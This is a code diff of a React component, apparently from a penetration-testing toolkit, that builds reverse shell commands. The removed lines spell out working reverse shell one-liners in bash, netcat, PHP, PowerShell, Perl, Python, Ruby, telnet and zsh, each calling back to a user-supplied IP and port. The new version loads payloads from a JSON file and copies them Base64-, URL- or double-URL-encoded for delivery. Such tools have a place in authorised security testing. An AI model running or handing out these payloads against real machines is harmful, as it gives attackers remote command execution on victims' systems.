@@ -1,338 +1,350 @@
-import React from 'react';
-import { Button, message, Typography, Row, Col, Divider, Input } from 'antd';
-import { CopyOutlined, WifiOutlined, LinkOutlined, createFromIconfontCN } from '@ant-design/icons';
+import React, { useRef, useState } from 'react';
+import { message, Typography, Row, Col, Input, Table, Tag, Select, Form, InputRef, Button, Space, Dropdown } from 'antd';
+import type { ColumnsType, TableProps } from 'antd/es/table';
+import { SearchOutlined, WifiOutlined, createFromIconfontCN } from '@ant-design/icons';
 import PersistedState from 'use-persisted-state';
-import QueueAnim from 'rc-queue-anim';
 import { Ipv4TcpCacheState } from 'components/types/Ipv4TcpCacheState';
-import Clipboard from 'react-clipboard.js';
+import { ColumnType, FilterConfirmProps, FilterValue, SorterResult } from 'antd/es/table/interface';
+import Highlighter from 'react-highlight-words';
 
 const { Title, Paragraph, Text } = Typography;
 const IconFont = createFromIconfontCN( {
     scriptUrl: [ './iconfont.js' ]
 } );
 
+interface DataType {
+    key: React.Key;
+    name: string;
+    tags: string[];
+    command: string;
+}
+
+type DataIndex = keyof DataType;
+
+
 export default function ReverseShell () {
     const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );
+    const [ searchText, setSearchText ] = useState( '' );
+    const [ searchedColumn, setSearchedColumn ] = useState( '' );
+    const searchInput = useRef<InputRef>( null );
+
     const [ values, setValues ] = useIPv4State( {
         ip: '',
-        port: ''
+        port: '',
+        shell: '/bin/sh',
     } );
+
+    const [ messageApi, contextHolder ] = message.useMessage();
+    const info = () => {
+        messageApi.success( 'Your reverse shell has been copied to the clipboard!' );
+    };
+
+    const items = [
+        {
+            key: '1',
+            label: 'Base64 Encoded',
+        },
+        {
+            key: '2',
+            label: 'URL Encoded',
+        },
+        {
+            key: '3',
+            label: 'Double URL Encoded',
+        },
+    ];
+
     const handleChange = ( name: string ) => ( event: { target: { value: string } } ) => {
         setValues( { ...values, [ name ]: event.target.value } );
     };
-    const successInfoReverseShell = () => {
-        message.success( 'Your reverse shell has been copied successfully !' );
+
+    const handleChangeSelect = ( prop: string ) => ( data: any ) => {
+        setValues( { ...values, [ prop ]: data } );
     };
-    const successInfoEncodeURL = () => {
-        message.success( 'Reverse shell URI encoded has been copied successfully !' );
+
+    const [ filteredInfo, setFilteredInfo ] = useState<Record<string, FilterValue | null>>( {} );
+    const [ sortedInfo, setSortedInfo ] = useState<SorterResult<DataType>>( {} );
+    const handleChangeFilter: TableProps<DataType>[ 'onChange' ] = ( _, filters, sorter ) => {
+        setFilteredInfo( filters );
+        setSortedInfo( sorter as SorterResult<DataType> );
     };
-    const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${ values.ip }/${ values.port } <&1'`;
-    const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ values.ip } ${ values.port } >/tmp/f`;
-    const php_rshell = `php -r '$sock=fsockopen(getenv("${ values.ip }"),getenv("${ values.port }"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
-    const PS_rshell = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ values.ip }',${ values.port });$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
-    const perl_rshell = `perl -e 'use Socket;$i="$ENV{${ values.ip }}";$p=$ENV{${ values.port }};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
-    const python_rshell = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ values.ip }",${ values.port }));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
-    const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${ values.ip }"],ENV["${ values.port }"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
-    const telnet_rshell = `TF=$(mktemp -u); mkfifo $TF && telnet ${ values.ip } ${ values.port } 0<$TF | /bin sh 1>$TF`;
-    const zsh_rshell = `zsh -c 'zmodload zsh/net/tcp && ztcp ${ values.ip } ${ values.port } && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`;
+
+    const handleSearch = (
+        selectedKeys: string[],
+        confirm: ( param?: FilterConfirmProps ) => void,
+        dataIndex: DataIndex,
+    ) => {
+        confirm();
+        setSearchText( selectedKeys[ 0 ] );
+        setSearchedColumn( dataIndex );
+    };
+
+    const handleReset = ( clearFilters: () => void ) => {
+        clearFilters();
+        setSearchText( '' );
+    };
+
+    const getColumnSearchProps = ( dataIndex: DataIndex ): ColumnType<DataType> => ( {
+        filterDropdown: ( { setSelectedKeys, selectedKeys, confirm, clearFilters, close } ) => (
+            <div style={{ padding: 8 }} onKeyDown={( e ) => e.stopPropagation()}>
+                <Input
+                    ref={searchInput}
+                    placeholder={`Search ${ dataIndex }`}
+                    value={selectedKeys[ 0 ]}
+                    onChange={( e ) => setSelectedKeys( e.target.value ? [ e.target.value ] : [] )}
+                    onPressEnter={() => handleSearch( selectedKeys as string[], confirm, dataIndex )}
+                    style={{ marginBottom: 8, display: 'block' }}
+                />
+                <Space>
+                    <Button
+                        type="primary"
+                        onClick={() => handleSearch( selectedKeys as string[], confirm, dataIndex )}
+                        icon={<SearchOutlined />}
+                        size="small"
+                        style={{ width: 90 }}
+                    >
+                        Search
+                    </Button>
+                    <Button
+                        onClick={() => clearFilters && handleReset( clearFilters )}
+                        size="small"
+                        style={{ width: 90 }}
+                    >
+                        Reset
+                    </Button>
+                    <Button
+                        type="link"
+                        size="small"
+                        onClick={() => {
+                            confirm( { closeDropdown: false } );
+                            setSearchText( ( selectedKeys as string[] )[ 0 ] );
+                            setSearchedColumn( dataIndex );
+                        }}
+                    >
+                        Filter
+                    </Button>
+                    <Button
+                        type="link"
+                        size="small"
+                        onClick={() => {
+                            close();
+                        }}
+                    >
+                        Close
+                    </Button>
+                </Space>
+            </div>
+        ),
+        filterIcon: ( filtered: boolean ) => (
+            <SearchOutlined style={{ color: filtered ? '#1890ff' : undefined }} />
+        ),
+        onFilter: ( value, record ) =>
+            record[ dataIndex ]
+                .toString()
+                .toLowerCase()
+                .includes( ( value as string ).toLowerCase() ),
+        onFilterDropdownVisibleChange: ( visible: any ) => {
+            if ( visible ) {
+                setTimeout( () => {
+                    searchInput.current?.select();
+                }, 100 );
+            } else {
+                setSearchedColumn( "" );
+            }
+        },
+        render: ( text ) =>
+            searchedColumn === dataIndex ? (
+                <Highlighter
+                    highlightStyle={{ backgroundColor: '#ffc069', padding: 0 }}
+                    searchWords={[ searchText ]}
+                    autoEscape
+                    textToHighlight={text ? text.toString() : ''}
+                />
+            ) : (
+                text
+            ),
+    } );
+
+
+    const columns: ColumnsType<DataType> = [
+        {
+            title: 'Name', dataIndex: 'name', key: 'name', filteredValue: filteredInfo.name || null,
+            onFilter: ( value: string, record ) => record.name.includes( value ),
+            sorter: ( a, b ) => a.name.length - b.name.length,
+            ...getColumnSearchProps( 'name' ),
+            sortOrder: sortedInfo.columnKey === 'name' ? sortedInfo.order : null,
+            ellipsis: true,
+        },
+        {
+            title: 'Tags',
+            dataIndex: 'tags',
+            key: 'tags',
+            render: ( _, { tags } ) => (
+                <>
+                    {tags.map( ( tag ) => {
+                        switch ( tag ) {
+                            case 'linux':
+                                return <Tag color="volcano" key={tag}>{tag.toUpperCase()}</Tag>;
+                            case 'mac':
+                                return <Tag color="green" key={tag}>{tag.toUpperCase()}</Tag>;
+                            case 'windows':
+                                return <Tag color="blue" key={tag}>{tag.toUpperCase()}</Tag>;
+                            default:
+                                return <Tag color="black" key={tag}>{tag.toUpperCase()}</Tag>;
+                        }
+                    } )}
+                </>
+            ),
+            filters: [
+                { text: 'Linux', value: 'linux' },
+                { text: 'macOS', value: 'mac' },
+                { text: 'Windows', value: 'windows' },
+            ],
+            filteredValue: filteredInfo.tags || null,
+            onFilter: ( value: string, record ) => record.tags.includes( value ),
+            sortOrder: sortedInfo.columnKey === 'tags' ? sortedInfo.order : null,
+            ellipsis: true,
+        },
+        {
+            title: 'Action',
+            dataIndex: 'action',
+            key: 'action',
+            render: ( _, { command } ) => (
+                <>
+                    <Dropdown.Button
+                        menu={{
+                            items, onClick: ( e ) => {
+                                switch ( e.key ) {
+                                    case '1':
+                                        // base64 encoded
+                                        info()
+                                        navigator.clipboard.writeText( btoa( command ) );
+                                        break;
+                                    case '2':
+                                        // url encoded
+                                        info()
+                                        navigator.clipboard.writeText( encodeURIComponent( command ) );
+                                        break;
+                                    case '3':
+                                        // double url encoded
+                                        info()
+                                        navigator.clipboard.writeText( encodeURIComponent( encodeURIComponent( command ) ) );
+                                        break;
+                                    default:
+                                        info()
+                                        break;
+                                }
+                            },
+                        }}
+                        onClick={() => { info(); navigator.clipboard.writeText( command ); }}
+                    >
+                        Copy
+                    </Dropdown.Button>
+                </>
+            ),
+        },
+    ];
+
+    let payloads = require( '../../assets/data/RevShell.json' );
+
+    const data: DataType[] = payloads.map( ( payload: any ) => ( {
+        key: payload.id,
+        name: payload.name,
+        tags: payload.tags,
+        command: payload.command,
+    } ) );
+
+    data.forEach( ( payload ) => {
+        if ( payload.command ) {
+            payload.command = payload.command.replace( /\${values.ip}/g, String( values.ip ) );
+            payload.command = payload.command.replace( /\${values.port}/g, String( values.port ) );
+            payload.command = payload.command.replace( /\{shell}/g, String( values.shell ) );
+        }
+    } );
 
     return (
-        <QueueAnim delay={300} duration={1500}>
-            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
-                Reverse shell
-            </Title>
-            <Paragraph style={{ margin: 15 }}>
-                A reverse shell is a shell session established on a connection that is initiated from a remote machine,
-                not from the local host.
-            </Paragraph>
-            <div style={{ padding: 15 }}>
-                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
-                    <Col span={12}>
-                        <Input
-                            maxLength={15}
-                            prefix={<WifiOutlined />}
-                            name='Ip adress'
-                            placeholder='IP Address or domain (ex: 212.212.111.222)'
-                            onChange={handleChange( 'ip' )}
-                            value={values.ip}
-                        />
-                    </Col>
-                    <Col span={12}>
-                        <Input
-                            maxLength={5}
-                            prefix={<IconFont type='icon-Network-Plug' />}
-                            name='Port'
-                            placeholder='Port (ex: 1337)'
-                            onChange={handleChange( 'port' )}
-                            value={values.port}
-                        />
-                    </Col>
-                </Row>
-            </div>
-            <Divider orientation='center'>Bash</Divider>
-            <div style={{ padding: 10, marginTop: 15 }} key='a'>
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{bash_rshell}</Text>
-                    </pre>
+        <div>
+            {contextHolder}
+            <div>
+                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
+                    Reverse shell
+                </Title>
+                <Paragraph style={{ margin: 15 }}>
+                    A reverse shell is a type of network communication in which a connection is established from a remote host (the "attacker") to a target host (the "victim") and the attacker is able to execute commands on the victim's machine as if they were running on the attacker's machine. This is typically done by exploiting a vulnerability in the victim's system or by tricking the victim into running a malicious program that establishes the reverse shell.
                 </Paragraph>
-                <Clipboard component='a' data-clipboard-text={bash_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined /> Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( bash_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
+                <div style={{ padding: 15 }}>
+                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
+                        <Col span={8}>
+                            <Input
+                                maxLength={15}
+                                prefix={<WifiOutlined />}
+                                name='Ip adress'
+                                placeholder='IP Address or domain (ex: 212.212.111.222)'
+                                onChange={handleChange( 'ip' )}
+                                value={values.ip}
+                            />
+                        </Col>
+                        <Col span={8}>
+                            <Input
+                                maxLength={5}
+                                prefix={<IconFont type='icon-Network-Plug' />}
+                                name='Port'
+                                placeholder='Port (ex: 1337)'
+                                onChange={handleChange( 'port' )}
+                                value={values.port}
+                            />
+                        </Col>
+                        <Col span={8}>
+                            <Form.Item name='shell' valuePropName={String( values.shell )} label='Shell'>
+                                <Select
+                                    onChange={handleChangeSelect( 'shell' )}
+                                    placeholder='/bin/sh'
+                                    value={String( values.shell )}
+                                    allowClear
+                                    options={[
+                                        {
+                                            label: 'Linux / macOS',
+                                            options: [
+                                                { label: 'sh', value: 'sh' },
+                                                { label: '/bin/sh', value: '/bin/sh' },
+                                                { label: 'bash', value: 'bash' },
+                                                { label: '/bin/bash', value: '/bin/bash' },
+                                            ],
+                                        },
+                                        {
+                                            label: 'Windows',
+                                            options: [
+                                                { label: 'cmd', value: 'cmd' },
+                                                { label: 'powershell', value: 'powershell' },
+                                                { label: 'pwsh', value: 'pwsh' },
+                                            ],
+                                        },
+                                    ]}>
+                                </Select>
+                            </Form.Item>
+                        </Col>
+                    </Row>
+                </div>
             </div>
-            <Divider orientation='center'>Zsh</Divider>
-            <div style={{ padding: 10, marginTop: 15 }} key='b'>
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{zsh_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={zsh_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined /> Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( zsh_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
+            <div>
+                <Table
+                    columns={columns}
+                    expandable={{
+                        expandedRowRender: ( record ) => (
+                            <Paragraph>
+                                <pre>
+                                    <Text copyable>
+                                        {record.command}
+                                    </Text>
+                                </pre>
+                            </Paragraph>
+                        ),
+                        rowExpandable: ( record ) => record.name !== 'Not Expandable',
+                    }}
+                    dataSource={data}
+                    onChange={values.ip && values.port && values.shell ? handleChangeFilter : undefined}
+                />
             </div>
-            <Divider orientation='center'>Netcat</Divider>
-            <div style={{ padding: 10, marginTop: 15 }} key='c'>
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{netcat_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={netcat_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined /> Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( netcat_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-            <Divider orientation='center'>PHP</Divider>
-            <div
-                key='d'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{php_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={php_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( php_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-
-            <Divider orientation='center'>PowerShell</Divider>
-            <div style={{ padding: 10, marginTop: 15 }} key='e'>
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{PS_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={PS_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined /> Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( PS_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-            <div
-                key='f'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
-                <Divider orientation='center'>Perl</Divider>
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{perl_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={perl_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( perl_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-            <Divider orientation='center'>Python</Divider>
-            <div
-                key='g'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{python_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={python_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( python_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-            <Divider orientation='center'>Ruby</Divider>
-            <div
-                key='h'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{ruby_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={ruby_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( ruby_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-            <Divider orientation='center'>Telnet</Divider>
-            <div style={{ padding: 15, marginTop: 15 }} key='i'>
-                <Paragraph>
-                    <pre>
-                        <Text copyable>{telnet_rshell}</Text>
-                    </pre>
-                </Paragraph>
-                <Clipboard component='a' data-clipboard-text={telnet_rshell}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the reverse shell
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( telnet_rshell )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
-            </div>
-        </QueueAnim>
+        </div >
     );
 }
